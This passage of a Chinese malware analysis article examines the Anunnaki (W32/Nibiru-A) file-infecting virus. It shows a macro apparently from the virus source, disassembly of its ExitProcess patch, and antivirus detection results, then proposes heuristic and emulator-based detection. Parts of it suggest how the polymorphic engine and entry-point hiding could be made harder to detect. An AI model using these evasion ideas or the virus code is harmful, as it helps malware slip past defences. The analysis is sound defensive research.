elseif (es eq 1) and ("&c" ne "\\")  
    .err "push_ua: unknown specifier \\&c"  
else  
    cn = "&c"  
endif  
if (("&c" ne "\\") or (es ne 0)) and ((hex eq 0) or (hid ge 2)) and ((dcm eq 0) or (hid ge 3))  
    hex  = 0  
    dcm  = 0  
    hid  = 0  
    es   = 0  
    pvar = pvar + (cn shl (8*cnt))  
    cnt  = cnt+1+(au)  
    if cnt eq 4  
        if ((idx gt idx2) and (au eq 0)) or ((idx ge idx2) and (au eq 1))  
            exitm  
        endif  
        pvar = 0  
        cnt  = 0  
    endif  
    idx  = idx+1  
elseif ((hex eq 0) or (hid ge 2)) and ((dcm eq 0) or (hid ge 3))  
    es = 1  
endif  
endm  ;;internal IRPC  
if idx ge idx2  
    push pvar  
endif  
idx2 = idx2-2  
if au eq 0  
    idx2 = idx2-2  
endif  
endm  ;;external REPT  
endm  
```

## 4. EPO 跟踪

`EPO` 的跟踪非常重要，在判断一个程序是否有 `Malicious code` 中，这一点几乎是决定因素，因为它是作为一个承前启后的关联所在。

`Anunnaki` patch 了 `ExitProcess` 函数，这是一个稳妥的方式，但因为缺少变化,是可以被检测出来的。

我们编写一个 `scape-goat` 程序:

```asm
.586  
.model flat , stdcall  
include kernel32.inc  
includelib kernel32.lib  
.code  
START:  
    invoke ExitProcess,0  
end START  
```

让 `Anunnaki` 去感染它，效果如下:

原始程序:  

```
00401000       6A 00            push 0                          ; /ExitCode = 0  
00401002   \.  E8 01000000      call <jmp.&kernel32.ExitProcess>      ; \ExitProcess  
00401007       CC               int3  
00401008   .- FF25 00204000     jmp dword ptr ds:[<&kernel32.ExitProcess>;   kernel32.ExitProcess  
```

感染后的程序:      

```
00401000     $  6A 00            push 0  
00401002     .  E8 01000000      call s_g.00401008  
00401007     .  CC               int3  
00401008     $  E8 37360000      call s_g.00404644   --- > 一个跨段跳转  
```

所以对一个中等强度的启发式扫描器，在不考虑误报的情况下来说以上的信息足够多了。

用 `AV` 产品检测一下被感染的 `scape-goat`，遗憾的是国内外几十个产品仅有以下产品能发现，还包括 `OEM` 引擎在内。

`AntiVir` -- `TR/Dropper.Gen`

`Authentium` -- `W32/Zbot.1!Generic (Possible)`

`AVG` -- `BackDoor.PoisonIvy.AD`

`F-Prot` -- `W32/Zbot.1!Generic`

`Forti` -- `Suspicious`

`panda` -- `Suspicious file`

`Sophos` -- `W32/Nibiru-A`

`VirusBuster` -- `Win32.Agent.PKCD`

再重新感染一个复杂一点的应用程序,则只剩下两个产品能发现

`Sophos` -- `W32/Nibiru-A`

`VirusBuster` -- `Win32.Agent.PKCD`

感叹一下 `Sophos`，它的分析速度非常快，截止 09-11-05 提供检测方案,并且精准的报出了病毒名称，`W32/Nibiru-A` 就是 `Anunnaki` 目前版本的病毒名称。同样 `VirusBuster` 用自己的启发式扫描器也检查出了病毒行为。

相比来说，`Anunnaki` 的 `epo` 还是很温柔的，如果随机 patch `APIs`，再配合 `Z0MBiE` 的 `code intergration` 中的一些思路，那绝对会让人疯掉，除了 `av-vm` 的绝对强悍外就只能寄希望于主动防御技术来进行防护而不是检测了。

## 5. `polymorphic` 的不足

这里谈的 `polymorphic` 不足仅是我个人的一些想法，如有不合理的地方，还望指正。

1. `ope` 的最强大的地方是仿真无效指令的生成,但作为多态引擎的级别，可以进一步加强，如对 `decryptor` 结构化处理，以此来做到指令乱序，因为针对 `anti-emulator` and `anti-heuristic` 方面，最薄弱的就是 `decryptor`。

2. 加解密方案上，目前仅使用了 `key` ，`slide_key` ，及随机多重加密方式，较为简单，如果加密方面足够复杂，也就可以利用结构化处理，做到指令乱序，当然 `ope` 更多的是带了有趣的技术（比如 `rand call APIs` 的思路）而不是堆砌一堆复杂无趣的东西。

3. 其实没有了，`ope` 已经足够 `Offensive`.

## 6. 关于检测

还有很多这样的地方可以寻找出来，作为检测的依据，以 `aver` 的角度来说,一个不太合适的比喻是,“越是反抗，越是暴露”

### [0x05].启发式技术检测 `Anunnaki`

单纯的静态分析是不容易检测 `Anunnaki`,需要配合一些仿真手段，这里的仿真器是配合检测使用的，不是 `av-vm`，那才是一个完备的虚拟检测环境。检测的原理就是前面提到的那些 `Anunnaki` 出现的特性，当然作为启发式检测需要从更抽象的方面来获得检测信息，而不止已经出现的技术特点。

#### 1. 构造仿真器

为了完成检测，需要一个仿真 `cpu`，运行时的内存区，栈区。

寄存器的索引

```c
enum E_Registers_Index  
{  
    E_EAX = 0,E_ECX,E_EDX,E_EBX,E_ESP,E_EBP,E_ESI,E_EDI  
}  
```

标志寄存器的索引

```c
enum E_Flag_Index  
{ E_CF = 0 ,E_ZF,E_SF,E_OF,E_DF,E_PF,E_AF,E_TF,E_IF}  
```

定义 32bit 的通用寄存器

```c
union Regsiter  
{  
    u32  _32;  
    u16  _16;  
    struct _8  
    {  
        s8  _l;  
        s8  _h;  
    }  
};  
```

仿真的 `cpu`

```c
struct E_CPU   
{  
    struct Regsiter[8];  
    u8     Flag[6];     
}  
```

仿真执行环境

```c
struct E_EXEC_ENV  
{  
    struct E_CPU  cpu;  
    u8            mem  [1024 * 1];  
    u8            stack[1024 * 1];  
    ...; // 涉及到一些地址转换的变量  
}      
```

更详细的关于仿真方面内容请参考 `linxer`《ring 3 级 32 位 `x86` `cpu` 仿真》.

#### 2. 执行时数据的跟踪 

可以在仿真器中，观察到如下情况

1. 解析代码段，寻找跳向最后一个节的 `call`，记录建立栈帧的地址 `addr_s`
2. 执行 `call` 后寄存器中出现小于 `addr_s` 的数值
3. `push imm32` / `pop rx` 为循环计数
4. 存在连续内存操作
5. 连续 `stack` 操作，之后 `decryptor` 执行完毕
6. `call` 重定位操作
7. 安装 `SEH`,
8. 操作 `fs:[30]`
9. ...

后面还有很多操作都足以引起扫描器的报警，如 `bpx` 的检测，`anti-debug` 等，从启发式扫描器的效率角度考虑，对已经分析的操作做一个界定即可，不必对所有的行为全部都分析出来。分析的逻辑有两种，一种是权值分析，一种是关联逻辑。使用上只能是具体问题具体分析。

`Anunnaki` 使用了大量的下面指令结构，也可以作为一种检测依据。

```asm
00A02D73    E8 00000000     call 00A02D78  
00A02D78    5E              pop esi  
00A02D79    81C6 34B2BFFF   add esi,FFBFB234  
00A02D7F    81C6 54204000   add esi,402054  
00A02D85    E8 00000000     call 00A02D8A  
00A02D8A    59              pop ecx  
00A02D8B    81C1 22B2BFFF   add ecx,FFBFB222  
00A02D91    81C1 10000000   add ecx,10      
```

#### 3. 没有终结的对抗

从 `vxer` 的角度讲,逃过 `aver` 检测技术的技术，总会在下一个时间出现，防御技术也总要修修补补。比如，完全不用考虑兼容性，不再费尽脑力的考虑如何获得 `kernel32` `base` 的新方法,

而是直截了当的

```asm
mov eax,[92028h]; os version xp sp3  
mov eax,7c800000; 0s version xp sp2  
```

这样硬编码即可,这样使得作为启发式检测的依据就又少了一些。同样，由 `vxer` 奇思妙想精心构造引擎，也可能在短时间内遭到 `aver` 封杀。 

游戏只能这样玩下去...    

### [0x06].其他

由于病毒木马的制造环境因素，总会在下一个时间出现同家族的不同变种，或者新的病毒具有和以往家族相似的行为，这使得启发式技术始终处于未知病毒的防御状态，如何完善与丰富检测技术将是安全研究人员继续努力的方向。

附参考文献:

[1] `Dark Prophet`.  《`Anunnaki`》

[2] `peter szor` .  《`The Art of Computer Virus Research and Defense`》

[3] `linxer`     .  《ring 3 级 32 位 `x86` `cpu` 仿真》
